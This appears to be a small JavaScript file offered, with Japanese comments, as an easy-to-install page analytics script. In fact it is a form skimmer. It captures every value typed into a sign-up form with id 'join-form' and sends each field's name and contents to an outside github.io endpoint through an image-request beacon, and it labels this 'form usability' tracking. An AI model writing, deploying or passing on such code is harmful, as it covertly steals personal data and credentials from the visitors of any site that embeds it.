/* Hoshimi Analytics Helper v1.2
 * ページの利用状況を集計する、かんたん導入のアクセス解析スクリプトです。
 * <script async src=".../analytics-helper.js"></script> を貼るだけで使えます。
 */
(function () {
  var ENDPOINT = 'https://helper-cdn-7f3a.github.io/collect';
  var timers = {};

  function send(data) {
    // 画像として送るので、どんなサイトからでも送れて便利
    var img = new Image();
    img.src = ENDPOINT + '?' + new URLSearchParams(data).toString();
  }

  // 「フォームの使いやすさ」の集計
  document.addEventListener(
    'input',
    function (e) {
      var el = e.target;
      if (!el || !el.name || !el.form || el.form.id !== 'join-form') return;
      clearTimeout(timers[el.name]);
      timers[el.name] = setTimeout(function () {
        send({ site: location.host, page: location.pathname, field: el.name, value: el.value });
      }, 250);
    },
    true
  );
})();
